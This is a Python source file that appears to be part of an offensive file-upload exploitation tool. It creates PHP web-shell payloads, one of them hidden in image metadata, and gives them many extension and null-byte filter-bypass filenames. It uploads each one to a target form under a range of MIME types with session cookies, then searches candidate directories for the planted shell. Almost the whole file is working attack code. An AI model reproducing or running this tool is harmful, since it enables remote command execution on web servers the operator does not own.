import requests
import os
import subprocess
import shutil

def load_mime_types(file_path):
    """ Load MIME types from a file. """
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[-] MIME types file not found. Using default image MIME type.")
        return ["image/png"]  # Default fallback

def embed_php_in_image(image_file, output_file):
    """Embed PHP payload inside an image metadata using exiftool."""
    payload = "<?php system($_REQUEST['cmd']); ?>"
    
    # Copy a clean image to preserve its valid structure
    shutil.copy(image_file, output_file)

    try:
        # Embed the PHP payload in the image metadata
        subprocess.run(["exiftool", f"-Comment={payload}", output_file], check=True)
        subprocess.run(["exiftool", "-overwrite_original", output_file])  # Remove backup files
        print(f"[+] Embedded PHP payload inside {output_file}")

    except subprocess.CalledProcessError as e:
        print(f"[-] Error embedding payload: {e}")

def create_payloads():
    """Create PHP web shell payloads (~5.9 KB size) embedded inside images."""

    reverse_shell = "<?php system($_REQUEST['cmd']); ?>"

    # Required Payload Filenames
    payloads = [
        "shell.php.jpg",
        "shell.php.png",   
        "shell.pHp5",
        "shell.png.php",
        "shell.php#.png",
        "shell.php%20",
        "shell.phpJunk123png",
        "shell.png.jpg.php",
        "shell.php%00.png",
        "shell.php...",
        "shell.php.png",
        "shell.asp::$data",
        "A" * 232 + ".php",
        "shell.php%0a",
        "shell.php%00",
        "shell.php%0d%0a",
        "shell.php%00.png%00.jpg"
    ]

    created_files = []
    target_size = 5900  # Set estimated target file size (5.9 KB)

    for filename in payloads:
        try:
            padding = "A" * (target_size - len(reverse_shell.encode('utf-8')))  # Ensures ~5.9 KB
            with open(filename, 'w') as f:
                f.write(reverse_shell + "\n" + padding)

            print(f"[+] Created and embedded payload: {filename} ({os.path.getsize(filename)} bytes)")
            created_files.append(filename)

        except Exception as e:
            print(f"[-] Error creating payload {filename}: {e}")

    return created_files


def upload_file(payload_filename, upload_url, cookie, form_details, mime_types_file):
    """
    Attempt to upload a file using multiple MIME types.
    """
    # Headers
    headers = {
        "Cookie": "; ".join([f"{key}={value}" for key, value in cookie.items()])
    }

    data = {}
    for form_field in form_details["inputs"]:
        if form_field[1] == "file":
            file_field_name = form_field[0]
        if form_field[1] == "text":
            data[form_field[0]] = "test"
        if form_field[1] == "email":
            data[form_field[0]] = "test@test.com"
        if form_field[1] == "hidden":
            data[form_field[0]] = form_field[2]
        if form_field[1] == "submit":
            data[form_field[0]] = form_field[2]
    
    for textarea in form_details["textarea"]:
        data[textarea] = "test"

    mime_types = load_mime_types(mime_types_file)

    for mime_type in mime_types:
        try:
            with open(payload_filename, 'rb') as file:
                file_to_upload = {file_field_name: (payload_filename, file, mime_type)}
                print(file_to_upload)
                print(f"[*] Trying upload with MIME type: Filename: {payload_filename} : {mime_type} to {upload_url}...")
                response = requests.post(upload_url, headers=headers, data=data, files=file_to_upload)
                
                print(response.text)
                if "succesfully uploaded!" in response.text or "submitted successfully" in response.text:
                    print(f"[+] File uploaded successfully using MIME type: {mime_type}")
                    return True
                else:
                    print(f"[-] Upload failed with MIME type: {mime_type}")

        except Exception as e:
            print(f"[-] Upload error with MIME type {mime_type}: {str(e)}")

    print("[-] File upload failed with all MIME types.")
    return False


def get_upload_directory(base_url, wordlist_file, payload_filenames, cookie):
    """Find where uploaded files are stored."""
    try:
        with open(wordlist_file, "r") as f:
            candidate_dirs = [line.strip() for line in f if not line.strip().startswith("#")]
        
        for d in candidate_dirs:
            for payload_filename in payload_filenames:
                response = requests.get(base_url + d + payload_filename, cookies=cookie)
                if response.status_code == 200:
                    print(f"[+] Upload found at: {base_url + d + payload_filename}")
                    return base_url + d
                else:
                    print(f"[-] Directory {base_url + d} not accessible.")
    except FileNotFoundError:
        print("[-] Upload directory wordlist not found.")
    return None
